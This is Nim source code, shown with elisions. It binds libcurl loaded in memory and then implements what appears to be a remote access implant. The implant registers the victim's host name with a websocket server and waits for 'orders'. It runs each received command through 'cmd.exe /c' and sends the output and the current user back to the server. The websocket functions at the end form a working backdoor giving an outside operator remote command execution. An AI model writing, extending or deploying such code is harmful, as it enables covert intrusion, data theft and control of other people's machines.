...
proc strequal*(s1, s2: cstring): int32{.cdecl, memlib: libname,
                                        importc: "curl_strequal".}
proc strnequal*(s1, s2: cstring, n: int): int32{.cdecl, memlib: libname,
    importc: "curl_strnequal".}
proc formadd*(httppost, last_post: PPcurl_httppost): FORMcode{.cdecl, varargs,
    memlib: libname, importc: "curl_formadd".}
proc formget*(form: Phttppost, arg: pointer, append: Formget_callback): int32{.
    cdecl, memlib: libname, importc: "curl_formget".}
proc formfree*(form: Phttppost){.cdecl, memlib: libname,
                                 importc: "curl_formfree".}
proc getenv*(variable: cstring): cstring{.cdecl, memlib: libname,
    importc: "curl_getenv".}
proc version*(): cstring{.cdecl, memlib: libname, importc: "curl_version".}
proc easy_escape*(handle: PCurl, str: cstring, len: int32): cstring{.cdecl,
    memlib: libname, importc: "curl_easy_escape".}
proc escape*(str: cstring, len: int32): cstring{.cdecl, memlib: libname,
    importc: "curl_escape".}
proc easy_unescape*(handle: PCurl, str: cstring, len: int32, outlength: var int32): cstring{.
    cdecl, memlib: libname, importc: "curl_easy_unescape".}
proc unescape*(str: cstring, len: int32): cstring{.cdecl, memlib: libname,
    importc: "curl_unescape".}
proc free*(p: pointer){.cdecl, memlib: libname, importc: "curl_free".}
proc global_init*(flags: int32): Code{.cdecl, memlib: libname,
...
proc global_init_mem*(flags: int32, m: Malloc_callback, f: Free_callback,
                      ...
                      c: Calloc_callback): Code{.cdecl, memlib: libname,
    importc: "curl_global_init_mem".}
proc global_cleanup*(){.cdecl, memlib: libname, importc: "curl_global_cleanup".}
proc slist_append*(slist: Pslist, p: cstring): Pslist{.cdecl, memlib: libname,
    importc: "curl_slist_append".}
proc slist_free_all*(para1: Pslist){.cdecl, memlib: libname,
                                     importc: "curl_slist_free_all".}
proc getdate*(p: cstring, unused: ptr Time): Time{.cdecl, memlib: libname,
    importc: "curl_getdate".}
proc share_init*(): PSH{.cdecl, memlib: libname, importc: "curl_share_init".}
proc share_setopt*(para1: PSH, option: SHoption): SHcode{.cdecl, varargs,
    memlib: libname, importc: "curl_share_setopt".}
proc share_cleanup*(para1: PSH): SHcode{.cdecl, memlib: libname,
    importc: "curl_share_cleanup".}
proc version_info*(para1: Version): Pversion_info_data{.cdecl, memlib: libname,
    importc: "curl_version_info".}
proc easy_strerror*(para1: Code): cstring{.cdecl, memlib: libname,
    importc: "curl_easy_strerror".}
proc share_strerror*(para1: SHcode): cstring{.cdecl, memlib: libname,
    importc: "curl_share_strerror".}

proc easy_init*(): PCurl{.cdecl, memlib: libname, importc: "curl_easy_init".}

proc easy_setopt*(curl: PCurl, option: Option): Code{.cdecl,varargs,memlib: libname,importc: "curl_easy_setopt".}

proc easy_perform*(curl: PCurl): Code{.cdecl, memlib: libname,importc: "curl_easy_perform".}

proc easy_cleanup*(curl: PCurl){.cdecl, memlib: libname, importc: "curl_easy_cleanup".}

proc ws_send*(curl: PCurl, payload: cstring, payload_size: int, sent: var int,fragsize: int, flag: int): Code{.cdecl,memlib: libname, importc: "curl_ws_send".}

proc ws_recv*(curl: PCurl, received: cstring, received_size: int, rlen: var int, curl_ws_frame: Ws_Frame): Code{.cdecl,memlib: libname, importc: "curl_ws_recv".}

proc easy_getinfo*(curl: PCurl, info: INFO): Code{.cdecl, varargs, memlib: libname,
    importc: "curl_easy_getinfo".}
proc easy_duphandle*(curl: PCurl): PCurl{.cdecl, memlib: libname,
                              importc: "curl_easy_duphandle".}
proc easy_reset*(curl: PCurl){.cdecl, memlib: libname, importc: "curl_easy_reset".}
proc multi_init*(): PM{.cdecl, memlib: libname, importc: "curl_multi_init".}
proc multi_add_handle*(multi_handle: PM, handle: PCurl): Mcode{.cdecl,
    memlib: libname, importc: "curl_multi_add_handle".}
proc multi_remove_handle*(multi_handle: PM, handle: PCurl): Mcode{.cdecl,
    memlib: libname, importc: "curl_multi_remove_handle".}
proc multi_fdset*(multi_handle: PM, read_fd_set: Pfd_set, write_fd_set: Pfd_set,
                  exc_fd_set: Pfd_set, max_fd: var int32): Mcode{.cdecl,
    memlib: libname, importc: "curl_multi_fdset".}
proc multi_perform*(multi_handle: PM, running_handles: var int32): Mcode{.
    cdecl, memlib: libname, importc: "curl_multi_perform".}
proc multi_cleanup*(multi_handle: PM): Mcode{.cdecl, memlib: libname,
    importc: "curl_multi_cleanup".}
proc multi_info_read*(multi_handle: PM, msgs_in_queue: var int32): PMsg{.cdecl,
    memlib: libname, importc: "curl_multi_info_read".}
proc multi_strerror*(para1: Mcode): cstring{.cdecl, memlib: libname,
    importc: "curl_multi_strerror".}
proc multi_socket*(multi_handle: PM, s: Socket, running_handles: var int32): Mcode{.
    cdecl, memlib: libname, importc: "curl_multi_socket".}
proc multi_socket_all*(multi_handle: PM, running_handles: var int32): Mcode{.
    cdecl, memlib: libname, importc: "curl_multi_socket_all".}
proc multi_timeout*(multi_handle: PM, milliseconds: var int32): Mcode{.cdecl,
    memlib: libname, importc: "curl_multi_timeout".}
proc multi_setopt*(multi_handle: PM, option: Moption): Mcode{.cdecl, varargs,
    memlib: libname, importc: "curl_multi_setopt".}
proc multi_assign*(multi_handle: PM, sockfd: Socket, sockp: pointer): Mcode{.
    cdecl, memlib: libname, importc: "curl_multi_assign".}
...
proc get_request*(): string =
  ...
  discard cli.easy_setopt(OPT_HTTPGET, 1)
  discard cli.easy_setopt(OPT_WRITEDATA, webData)
...
proc websocket_recv(curl_client: PCurl): string =
  while true:
    var buffer=newString(4096)
    var received: int
    var frame = new Ws_Frame
    discard curl_client.ws_recv(cstring(buffer),4096,received,frame[])
    if not isEmptyString(buffer):
      return buffer

proc websocket_send(curl_client: PCurl,payload: cstring): int =
  var sent: int
  discard curl_client.ws_send(payload,len(payload),sent,0,WS_TEXT)
  return 0


proc websocket_shell(curl_client: PCurl): int =
  while true:
    echo "[*] Waiting for orders...."
    let command_to_execute = websocket_recv(curl_client)
    echo "[*] Received : "&command_to_execute
    if command_to_execute == "exit":
      return 0
    else:
      let command_output = execCmdEx("cmd.exe /c "&command_to_execute).output
      var user=execCmdEx("cmd.exe /c "&"whoami").output
      var info = %* {"user": user}
      discard websocket_send(curl_client,cstring($info))
      discard websocket_send(curl_client,cstring(command_output))


proc websocket_register(curl_client: PCurl): int =
    while true:
      #let buffer = websocket_recv(curl_client)
      #echo "[*] Réponse : "&buffer
      let hostname = getHostName()
      let input = "RGRQ: "&hostname
      discard websocket_send(curl_client,cstring(input))
      let buffer2 = websocket_recv(curl_client)
      if "Welcome" in buffer2:
        return 0
      else:
        echo buffer2
        return 1
...
proc websocket_request_init*(): int =
  ...
  if res != E_OK:
    ...
    var is_registered=websocket_register(cli)
